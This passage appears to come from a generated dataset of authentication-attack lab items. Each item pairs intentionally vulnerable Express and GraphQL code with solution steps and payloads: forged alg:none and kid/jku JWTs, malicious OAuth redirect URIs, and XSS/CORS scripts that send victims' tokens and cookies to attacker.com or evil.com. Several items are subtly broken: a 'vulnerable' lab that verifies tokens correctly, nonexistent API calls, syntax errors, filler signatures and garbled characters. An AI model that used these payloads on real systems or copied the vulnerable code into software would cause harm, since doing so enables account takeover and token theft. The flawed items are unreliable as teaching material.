      "Modify the token by changing the alg header to 'none' and adding admin:true to payload",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Submit the modified token in Authorization header to access /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.post('/login', (req, res) => {\n    const {username, password} = req.body;\n    if (username === 'admin' && password === 's3cr3t') {\n        const token = jwt.sign({user: username, admin: true}, 'key123', {algorithm: 'HS256'});\n        return res.json({token});\n    }\n    const token = jwt.sign({user: username, admin: false}, 'key123', {algorithm: 'HS256'});\n    res.json({token});\n});\n\napp.get('/admin', (req, res) => {\n    try {\n        const token = req.headers.authorization.split(' ')[1];\n        const decoded = jwt.verify(token, {algorithms: ['HS256', 'none']});\n        if (decoded.admin) return res.send('Admin dashboard');\n        res.status(403).send('Forbidden');\n    } catch (e) {\n        res.status(401).send('Invalid token');\n    }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOnRydWV9.",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwiYWRtaW4iOnRydWV9."
    ]
  },
  {
    "Lab scenario": "GraphQL query injection in user search functionality",
    "Lab Description": "The lab's GraphQL endpoint improperly sanitizes user input in search queries. The application exposes sensitive fields through introspection. To solve: extract all user credentials via a single malicious GraphQL query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover GraphQL endpoint using OWASP ZAP's forced browsing",
      "Enable introspection and dump schema using GraphQL Voyager",
      "Craft query with nested fields to bypass field restrictions",
      "Inject malicious query through search parameter using Postman",
      "Extract password hashes and crack offline using John the Ripper"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type User {\n    id: ID!\n    username: String!\n    email: String!\n    password: String!\n  }\n  type Query {\n    searchUsers(term: String!): [User]\n  }\n`);\n\nconst root = {\n  searchUsers: ({term}) => {\n    return users.filter(u => \n      u.username.includes(term) || \n      u.email.includes(term)\n  }\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
    "payloads": [
      "query { searchUsers(term:\"' OR '1'='1'\") { id username email password } }",
      "query { __schema { types { name fields { name type { name } } } } }",
      "query { searchUsers(term:\"*\") { ... on User { id username password } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The lab's OAuth implementation fails to validate redirect URIs, allowing token interception. The application uses implicit flow with improper state validation. To solve: steal an OAuth token and authenticate as another user.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using Burp Suite by analyzing /oauth/authorize requests",
      "Register malicious redirect URI pointing to attacker-controlled server",
      "Craft phishing link with modified redirect_uri parameter",
      "Intercept authorization code/token when victim clicks link",
      "Exchange code for access token or use token directly in API calls"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {secret: 'sec123', redirectURIs: ['https://client.com/callback']}\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const token = 'rand0mt0k3n';\n  const redirect = `${redirect_uri}?code=${token}&state=${state}`;\n  res.redirect(redirect);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const {code, client_id, client_secret} = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    return res.json({access_token: 'useraccesstoken'});\n  }\n  res.status(401).send('Unauthorized');\n});\n\napp.listen(3000);",
    "payloads": [
      "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&response_type=token&state=123",
      "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://client.com.collab.domain&response_type=code&state=abc",
      "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://client.com%0d%0aLocation:%20https://attacker.com&response_type=token"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid user session request with Burp Suite to capture a sample JWT",
      "Decode the JWT using jwt.io to analyze its structure and claims",
      "Modify the algorithm header to 'none' and change the role claim to 'admin'",
      "Remove the signature portion of the JWT (after the last dot)",
      "Submit the modified token in the Authorization header to access admin functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  user1: { password: 'pass123', role: 'user' },\n  admin: { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.payload.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => console.log(`Server running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
    "Lab Description": "The OAuth implementation leaks authorization codes through open redirects. The application fails to validate redirect_uri against pre-registered URIs. To solve: steal an OAuth token by manipulating the redirect flow to a controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth authorization endpoint and parameters using OWASP ZAP",
      "Register a malicious callback URI containing attacker-controlled domain",
      "Initiate OAuth flow with victim's email via Postman",
      "Intercept authorization response containing leaked code",
      "Exchange code for access token at the OAuth token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'sec123',\n    redirectUris: ['https://trusted.com/callback']\n  }\n};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const code = 'AUTH_CODE_' + Math.random().toString(36).substring(2);\n  \n  res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({\n      access_token: 'ACCESS_TOKEN_' + Math.random().toString(36).substring(2),\n      token_type: 'bearer'\n    });\n  } else {\n    res.status(401).send('Invalid client credentials');\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`OAuth server running on port ${PORT}`));",
    "payloads": [
      "https://attacker.com/callback?code=STOLEN_CODE&state=123",
      "https://trusted.com.evil.com/callback?code=STOLEN_CODE",
      "https://trusted.com@evil.com/callback?code=STOLEN_CODE"
    ]
  },
  {
    "Lab scenario": "Session fixation in GraphQL authentication endpoint",
    "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. The application doesn't regenerate session tokens after login. To solve: fixate a session token on victim's browser then capture their authenticated session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send initial GraphQL query to /graphql endpoint using Postman to obtain session cookie",
      "Craft malicious link containing the session token in URL parameter",
      "Trick victim into authenticating while using the fixated session",
      "Monitor authenticated requests with the known session token in Burp Suite",
      "Reuse the session token to access victim's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n  }\n  type Mutation {\n    login(username: String!, password: String!): String\n  }\n`);\n\nconst root = {\n  getSession: (args, req) => {\n    if (!req.cookies.session) {\n      const session = 'SESS_' + Math.random().toString(36).substring(2);\n      req.res.cookie('session', session);\n      return 'New session created';\n    }\n    return 'Existing session';\n  },\n  login: ({username, password}, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      return 'Login successful';\n    }\n    return 'Invalid credentials';\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`GraphQL server running on port ${PORT}`));",
    "payloads": [
      "https://vulnerable.com/graphql?session=SESS_ATTACKER_TOKEN",
      "<script>document.cookie='session=SESS_ATTACKER_TOKEN'</script>",
      "https://vulnerable.com/graphql?redirect=https://evil.com&session=SESS_ATTACKER_TOKEN"
    ]
  },
  {
    "Lab scenario": "JWT alg:none exploitation in REST API authentication",
    "Lab Description": "The application uses JSON Web Tokens for session management but fails to properly validate the signature. The vulnerable endpoint accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT to escalate privileges to admin without valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid user session request with Burp Suite to capture JWT",
      "Decode the JWT using jwt.io or Burp Decoder to analyze structure",
      "Modify the alg header to 'none' and remove signature section",
      "Alter payload claims (role\u00e2\u2020\u2019admin) and submit to /api/admin",
      "Verify admin dashboard access confirms privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst SECRET = 'insecure_secret';\napp.get('/api/admin', (req, res) => {\n    const token = req.headers.authorization.split(' ')[1];\n    try {\n        const decoded = jwt.decode(token, { complete: true });\n        if (decoded.header.alg === 'none') {\n            const payload = decoded.payload;\n            if (payload.role === 'admin') {\n                return res.send('Admin dashboard');\n            }\n        } else {\n            jwt.verify(token, SECRET);\n        }\n    } catch (e) {\n        return res.status(403).send('Forbidden');\n    }\n    res.status(401).send('Unauthorized');\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE1OTY1ODQwfQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9."
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack in user enumeration endpoint",
    "Lab Description": "The GraphQL API implements authentication checks inefficiently, allowing batch queries to bypass rate limiting. The /graphql endpoint processes multiple authentication attempts in a single request. To solve: perform credential stuffing with 100+ combinations in one HTTP request to discover valid credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture normal login request with OWASP ZAP and convert to GraphQL format",
      "Craft batch query with 100 credential pairs using Postman",
      "Identify successful login by response time differentials",
      "Extract session token from successful authentication",
      "Access restricted /profile endpoint with stolen credentials"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer } = require('apollo-server-express');\nconst typeDefs = gql`\n  type Query {\n    login(username: String!, password: String!): AuthPayload\n  }\n  type AuthPayload {\n    token: String\n  }\n`;\nconst resolvers = {\n  Query: {\n    login: (_, { username, password }) => {\n      const user = users.find(u => u.username === username);\n      if (!user || user.password !== password) return { token: null };\n      return { token: 'generated_jwt_token' };\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });",
    "payloads": [
      "[{\"query\":\"query($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"password123\"}}},{\"query\":\"query($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"123456\"}}}]",
      "{\"query\":\"query{login1:login(username:\\\"carlos\\\",password:\\\"letmein\\\"){token} login2:login(username:\\\"carlos\\\",password:\\\"welcome1\\\"){token}}\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect in authorization flow",
    "Lab Description": "The OAuth 2.0 implementation fails to validate redirect_uri parameters, allowing attackers to intercept authorization codes. The vulnerable /oauth/authorize endpoint accepts arbitrary redirect destinations. To solve: construct malicious redirect URI to capture victim's token after they authenticate.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify OAuth initiation endpoint with Burp Suite",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Social engineer victim to initiate OAuth flow",
      "Intercept authorization code at malicious endpoint",
      "Exchange code for access token at /oauth/token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst oauth2 = require('simple-oauth2').create({\n  client: { id: 'client_id', secret: 'client_secret' },\n  auth: { tokenHost: 'http://localhost:3000' }\n});\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  if (!client_id) return res.status(400).send('Invalid client');\n  const authCode = generateAuthCode();\n  res.redirect(`${redirect_uri}?code=${authCode}&state=${state}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { code, redirect_uri } = req.body;\n  const token = oauth2.accessToken.create({ access_token: 'token', expires_in: 3600 });\n  res.json(token);\n});\napp.listen(3000);",
    "payloads": [
      "http://localhost:3000/oauth/authorize?response_type=code&client_id=webapp&redirect_uri=https://attacker.com/callback&scope=profile",
      "http://localhost:3000/oauth/authorize?client_id=mobileapp&redirect_uri=http%3A%2F%2Fevil.com%2Fsteal&state=123&response_type=code"
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in JWT generation endpoint",
    "Lab Description": "The application's JWT generation endpoint reflects user-controlled input without proper encoding. The vulnerable /api/jwt/generate endpoint echoes back the username in JWT claims when debug mode is active. To solve: chain stored XSS with session fixation to hijack admin session tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify JWT generation endpoint using OWASP ZAP spider",
      "Inject XSS payload in username parameter during JWT request",
      "Capture admin session when they view logs containing malicious JWT",
      "Extract valid JWT from admin's browser via XSS callback",
      "Replay stolen JWT in Authorization header to access /admin"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.post('/api/jwt/generate', (req, res) => {\n    const { username } = req.body;\n    const token = jwt.sign({ \n        user: username,\n        debug: process.env.DEBUG ? username : 'redacted'\n    }, 'weak_secret');\n    res.json({ token });\n});\napp.get('/admin', (req, res) => {\n    try {\n        const token = req.headers.authorization.split(' ')[1];\n        const decoded = jwt.verify(token, 'weak_secret');\n        if (decoded.user === 'admin') return res.send('Admin panel');\n    } catch (e) {\n        return res.status(403).send('Invalid token');\n    }\n    res.status(401).send('Unauthorized');\n});\napp.listen(3000);",
    "payloads": [
      "{\"username\":\"<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('token'))</script>\"}",
      "{\"username\":\"admin'\\\"</title><svg/onload=alert(document.cookie)>\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured CORS in identity provider",
    "Lab Description": "The OAuth provider's CORS policy allows arbitrary origins to access token endpoints. The vulnerable /oauth/token endpoint responds with Access-Control-Allow-Origin: * headers. To solve: craft malicious JavaScript to retrieve victim's OAuth tokens cross-origin.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth flow with Burp Suite to identify token endpoint",
      "Verify permissive CORS headers in OPTIONS responses",
      "Create malicious page with XMLHttpRequest to /oauth/token",
      "Social engineer victim to visit attacker page while authenticated",
      "Harvest OAuth tokens from attacker server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n    origin: '*',\n    methods: ['GET','POST'],\n    allowedHeaders: ['Authorization']\n}));\nconst tokens = {};\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (tokens[code]) {\n        res.json({\n            access_token: tokens[code],\n            token_type: 'Bearer'\n        });\n    } else {\n        res.status(400).json({ error: 'invalid_grant' });\n    }\n});\napp.listen(3001);",
    "payloads": [
      "fetch('https://oauth-provider/oauth/token', {\n  method: 'POST',\n  body: 'code=VICTIM_CODE',\n  credentials: 'include'\n}).then(r=>r.json()).then(token=>{\n  fetch('https://attacker.com/log?token='+token.access_token)\n});",
      "var xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://oauth-provider/oauth/token', true);\nxhr.withCredentials = true;\nxhr.send('code=VICTIM_CODE');\nxhr.onload=function(){ document.location='https://attacker.com/steal?token='+JSON.parse(this.responseText).access_token; };"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT verification service blindly trusts the kid header to load verification keys. The vulnerable /verify endpoint allows directory traversal in kid parameter. To solve: manipulate kid header to point to attacker-controlled key file and forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT using Burp Suite and analyze header",
      "Modify kid parameter to traverse to /dev/null or predictable file",
      "Generate symmetric key matching predictable file content",
      "Forge new JWT with modified claims using generated key",
      "Access internal /api/admin endpoint with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.post('/verify', (req, res) => {\n    const token = req.body.token;\n    const header = jwt.decode(token, {complete: true}).header;\n    const key = fs.readFileSync('/keys/'+header.kid);\n    try {\n        jwt.verify(token, key);\n        res.json({valid: true});\n    } catch(e) {\n        res.json({valid: false});\n    }\n});\napp.get('/api/admin', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    if (!token) return res.status(401).send('Unauthorized');\n    const header = jwt.decode(token, {complete: true}).header;\n    const key = fs.readFileSync('/keys/'+header.kid);\n    try {\n        const decoded = jwt.verify(token, key);\n        if (decoded.role === 'admin') return res.send('Admin access granted');\n    } catch(e) {}\n    res.status(403).send('Forbidden');\n});\napp.listen(3002);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.7s8X9xqZ0Q45t0z7Q9X7xqZ0Q45t0z7Q9X7xqZ0Q45t0",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9.3J1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation endpoint trusts arbitrary jku (JSON Key URL) headers without proper verification. The vulnerable /api/validate endpoint processes tokens with externally specified verification keys. To solve: host malicious JWK set and forge admin token with manipulated jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze headers",
      "Set up attacker-controlled server hosting malicious JWK set",
      "Forge new JWT with jku pointing to attacker server",
      "Modify payload claims to include admin privileges",
      "Submit forged token to /admin/dashboard endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/api/validate', async (req, res) => {\n    const token = req.body.token;\n    const header = jwt.decode(token, {complete: true}).header;\n    \n    if (header.jku) {\n        try {\n            const jwks = await axios.get(header.jku);\n            const key = jwks.data.keys[0].x5c[0];\n            jwt.verify(token, key);\n            return res.json({valid: true});\n        } catch(e) {}\n    }\n    res.json({valid: false});\n});\n\napp.get('/admin/dashboard', (req, res) => {\n    const token = req.headers.authorization?.split(' ')[1];\n    if (!token) return res.status(401).send('Unauthorized');\n    \n    const header = jwt.decode(token, {complete: true}).header;\n    if (header.jku) {\n        try {\n            const jwks = require('axios').getSync(header.jku);\n            const key = jwks.data.keys[0].x5c[0];\n            const decoded = jwt.verify(token, key);\n            if (decoded.role === 'admin') return res.send('Admin dashboard');\n        } catch(e) {}\n    }\n    res.status(403).send('Forbidden');\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItY29udHJvbGxlZC5jb20vbWFsY2lvdXMtanNvbiJ9.eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJhZG1pbiJ9.SIGNATURE",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9ldmlsLWtleXMifQ.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MTU5NjU4NDB9.SIGNATURE"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via insecure state parameter validation",
    "Lab Description": "The OAuth implementation fails to properly validate state parameters during token exchange. The vulnerable /oauth/callback endpoint processes authorization codes without verifying bound state values. To solve: intercept victim's OAuth flow and swap their authorization code for an access token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and capture requests with OWASP ZAP",
      "Note state parameter value and authorization code",
      "Construct malicious callback URL with victim's code and attacker's state",
      "Trigger token exchange with swapped parameters via Postman",
      "Use stolen token to access victim's resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst querystring = require('querystring');\n\nconst tokens = {};\nconst authCodes = {};\n\napp.get('/oauth/callback', (req, res) => {\n    const { code, state } = req.query;\n    \n    if (authCodes[code]) {\n        const token = 'generated_token_' + Math.random().toString(36).substr(2);\n        tokens[token] = authCodes[code];\n        const redirectUri = Buffer.from(state, 'base64').toString();\n        return res.redirect(redirectUri + '?token=' + token);\n    }\n    res.status(400).send('Invalid authorization code');\n});\n\napp.post('/oauth/token', (req, res) => {\n    const { code } = req.body;\n    if (authCodes[code]) {\n        const token = 'generated_token_' + Math.random().toString(36).substr(2);\n        tokens[token] = authCodes[code];\n        return res.json({ access_token: token });\n    }\n    res.status(400).json({ error: 'invalid_grant' });\n});\n\napp.listen(3001);",
    "payloads": [
      "https://oauth-provider/oauth/callback?code=VICTIM_CODE&state=ATTACKER_STATE",
      "POST /oauth/token HTTP/1.1\nHost: oauth-provider\nContent-Type: application/x-www-form-urlencoded\n\ncode=VICTIM_CODE&client_id=legitimate_client"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session migration after login",
    "Lab Description": "The application maintains pre-authentication session IDs post-login without regeneration. The vulnerable /login endpoint accepts existing session cookies after authentication. To solve: fixate session on victim's browser then trigger authentication to hijack their logged-in session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify session cookie setting before authentication using Burp",
      "Craft malicious link with fixated session ID",
      "Social engineer victim to authenticate while session is fixated",
      "Reuse victim's session ID to access authenticated endpoints",
      "Access restricted /user/profile data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\nconst users = {\n    admin: { password: 'secret123', role: 'admin' }\n};\n\napp.get('/preauth', (req, res) => {\n    const sessionId = req.cookies.session || Math.random().toString(36).substr(2);\n    sessions[sessionId] = { authenticated: false };\n    res.cookie('session', sessionId).send('Session initialized');\n});\n\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const sessionId = req.cookies.session;\n    \n    if (users[username] && users[username].password === password) {\n        if (sessions[sessionId]) {\n            sessions[sessionId].authenticated = true;\n            sessions[sessionId].username = username;\n            return res.send('Login successful');\n        }\n    }\n    res.status(401).send('Login failed');\n});\n\napp.get('/user/profile', (req, res) => {\n    const sessionId = req.cookies.session;\n    if (sessions[sessionId]?.authenticated) {\n        return res.json(sessions[sessionId]);\n    }\n    res.status(403).send('Access denied');\n});\n\napp.listen(3002);",
    "payloads": [
      "<img src=\"https://vulnerable-app/preauth\" onerror=\"document.location='https://attacker.com/collect?session='+document.cookie\">",
      "https://vulnerable-app/preauth?redirect=https://vulnerable-app/login?username=admin&password=secret123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "The login mechanism assigns a session identifier before verifying credentials. This allows an attacker to fixate a session for a victim. The application reuses the session token issued prior to authentication. To solve: hijack a session by forcing a victim to authenticate using a session token you control, then access their My account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start Burp Suite and intercept your own visit to the site before logging in. Note the Set-Cookie header assigning a session ID.",
      "Send a GET /login request with the session ID still active but without credentials to Burp Repeater.",
      "Manually craft a phishing link including your session ID and send it to the victim (simulate this by manually modifying the session cookie during login).",
      "Log in as the victim while reusing your previously fixed session ID.",
      "After successful login, access /my-account and confirm you\u00e2\u20ac\u2122re authenticated as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'sessionsecret', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'carlospw' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) { res.send('Welcome to your account, ' + req.session.username); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Manually reuse pre-auth session cookie in post-auth request",
      "Fixate session ID via phishing URL with pre-issued cookie",
      "Set-Cookie: sessionID=attackersession; Path=/"
    ]
  },
  {
    "Lab scenario": "JWT tampering vulnerability in API authorization header",
    "Lab Description": "The backend accepts JWTs signed with the 'none' algorithm. This exposes the application to JWT tampering where the payload can be altered without a valid signature. To solve: tamper with the token to elevate privileges and access the /admin endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to inspect a request with a valid JWT from a logged-in user.",
      "Decode the JWT and observe the header and payload fields. Notice that algorithm is set to 'HS256'.",
      "Craft a new JWT with { \"alg\": \"none\" } in the header and set the payload role to 'admin'.",
      "Remove the signature part entirely and resend the token in the Authorization header.",
      "Send a request to /admin with the tampered JWT and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', role: 'user' }, { username: 'carlos', role: 'admin' }]; app.get('/token', (req, res) => { const token = jwt.sign({ username: 'user', role: 'user' }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); if (decoded.role === 'admin') { res.send('Welcome admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(400).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\", \"role\":\"admin\"}",
      "JWT: base64url(header).base64url(payload). (no signature)"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage in redirect URI through Referer header",
    "Lab Description": "The OAuth implementation uses the implicit grant type and sends tokens in the URL fragment. When redirected to an insecure third-party page, the Referer header leaks the token. To solve: extract an access token leaked via the Referer header and use it to access a protected /profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start a proxy in Burp Suite and initiate the OAuth login flow.",
      "Observe the URL after redirection. Notice the access_token is included in the URL fragment.",
      "Redirect the user to a malicious domain (e.g., http://evil.com) that logs the Referer header.",
      "Capture the Referer header on your malicious domain to extract the token.",
      "Use Postman to send a request to /profile with the stolen token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'token123': 'carlos' }; app.get('/auth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'token123'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/profile', (req, res) => { const auth = req.headers['authorization']; if (auth === 'Bearer token123') { res.send('Sensitive data for carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Token Leakage Lab running on http://localhost:' + PORT));",
    "payloads": [
      "OAuth callback URI redirecting to http://evil.com",
      "Stolen token: Bearer token123",
      "Authorization: Bearer token123"
    ]
  },
  {
    "Lab scenario": "Session fixation in login handler logic",
